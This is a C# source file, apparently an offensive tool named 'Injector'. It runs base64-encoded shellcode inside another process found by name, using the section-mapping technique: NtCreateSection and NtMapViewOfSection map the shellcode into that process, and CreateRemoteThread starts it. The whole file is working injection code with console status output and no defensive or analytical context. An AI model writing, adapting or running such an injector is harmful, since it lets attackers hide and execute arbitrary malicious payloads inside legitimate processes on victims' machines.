using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;

namespace Injector {
	public class Class1 {


		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

		[StructLayout(LayoutKind.Explicit, Size = 8)]
		struct LARGE_INTEGER {
			[FieldOffset(0)] public Int64 QuadPart;
			[FieldOffset(0)] public UInt32 LowPart;
			[FieldOffset(4)] public Int32 HighPart;
		}

		[DllImport("ntdll.dll", SetLastError = true)]
		static extern UInt32 NtCreateSection(
		ref IntPtr SectionHandle,
		UInt32 DesiredAccess,
		IntPtr ObjectAttributes,
		ref LARGE_INTEGER MaximumSize,
		UInt32 SectionPageProtection,
		UInt32 AllocationAttributes,
		IntPtr FileHandle);

		[DllImport("ntdll.dll", SetLastError = true)]
		static extern uint NtMapViewOfSection(
		IntPtr SectionHandle,
		IntPtr ProcessHandle,
		ref IntPtr BaseAddress,
		UIntPtr ZeroBits,
		UIntPtr CommitSize,
		out ulong SectionOffset,
		out uint ViewSize,
		uint InheritDisposition,
		uint AllocationType,
		uint Win32Protect);

		[DllImport("ntdll.dll", SetLastError = true)]
		static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

		[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
		static extern int NtClose(IntPtr hObject);

		[Flags]
		public enum SECTION : UInt32 {
			SECTION_QUERY = 0x0001,
			SECTION_MAP_WRITE = 0x0002,
			SECTION_MAP_READ = 0x0004,
			SECTION_MAP_EXECUTE = 0x0008,
			SECTION_EXTEND_SIZE = 0x0010,
			SECTION_MAP_EXECUTE_EXPLICIT = 0x0020, // not included in SECTION_ALL_ACCESS
			STANDARD_RIGHTS_REQUIRED = 0x000F0000,
			SECTION_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED | SECTION_QUERY | SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_EXTEND_SIZE
		}

		[DllImport("kernel32.dll")]
		static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

		[DllImport("ntdll.dll", SetLastError = true)]
		static extern int ZwCreateThreadEx(ref IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, Int32 stackZeroBits, Int32 sizeOfStack, Int32 maximumStackSize, IntPtr attributeList);

		[DllImport("kernel32")]
		public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, int dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, int dwCreationFlags, out IntPtr lpThreadId);


		public static void Main(string[] args) {

			Console.WriteLine($"[+] Executing with injection module with {args[1]} ...");

			byte[] buf = Convert.FromBase64String(args[0]);
			string target = args[1];

			LARGE_INTEGER maxSize = new LARGE_INTEGER();
			IntPtr sectionhandle = IntPtr.Zero;

			maxSize.HighPart = 0;
			maxSize.LowPart = 0x1000;

			// Create Memory Section
			uint result = NtCreateSection(ref sectionhandle, 0x0001 | 0x0002 | 0x0004 | 0x0008 | 0x0010 | 0x0020 | 0x000F0000, IntPtr.Zero, ref maxSize, 0x40, 0x8000000, IntPtr.Zero);
			if (result == 0) {
				Console.WriteLine(String.Format("CreateSection - Handle: {0:X}", sectionhandle.ToInt64()));
			}

			// NtMapViewOfSection - RW
			IntPtr sectionBaseAddress = IntPtr.Zero;
			uint viewSize = 0;
			ulong ox = 0;
			UIntPtr v = (UIntPtr)0;

			result = NtMapViewOfSection(sectionhandle, Process.GetCurrentProcess().Handle, ref sectionBaseAddress, v, v, out ox, out viewSize, 0x2, 0, 0x4);
			if (result == 0) {
				Console.WriteLine(String.Format("NtMapViewOfSection - RW OK: {0:X}", sectionBaseAddress.ToInt64()));
			}

			Console.WriteLine("Copying shellcode into section...");
			Marshal.Copy(buf, 0, sectionBaseAddress, buf.Length);
			Console.WriteLine("Shell Code size: {0} ", buf.Length);

			try {
				Process processtarget2 = Process.GetProcessesByName(target)[0];
				Console.WriteLine($"Found target PID: {processtarget2.Id} ");
			} catch (Exception ex) {
				Console.WriteLine($"Error reading process: {ex.Message}");
			}

			Process processtarget = Process.GetProcessesByName(target)[0];
			// NtMapViewOfSection - RX
			IntPtr sectionBaseAddress2 = IntPtr.Zero;
			result = NtMapViewOfSection(sectionhandle, processtarget.Handle, ref sectionBaseAddress2, v, v, out ox, out viewSize, 0x2, 0, 0x20);
			if (result == 0) {
				Console.WriteLine(String.Format("NtMapViewOfSection - RX OK: {0:X}", sectionBaseAddress2.ToInt64()));
			}


			result = NtUnmapViewOfSection(Process.GetCurrentProcess().Handle, sectionBaseAddress);
			if (result == 0) {
				Console.WriteLine("NtUnmapViewOfSection - OK");
			}

			IntPtr bytesout;
			IntPtr modulePath = CreateRemoteThread(processtarget.Handle, IntPtr.Zero, 0, sectionBaseAddress2, IntPtr.Zero, 0, out bytesout);
			Console.WriteLine(String.Format("CreateRemoteThread = {0:X}", modulePath.ToInt32()));

		}

	}
}
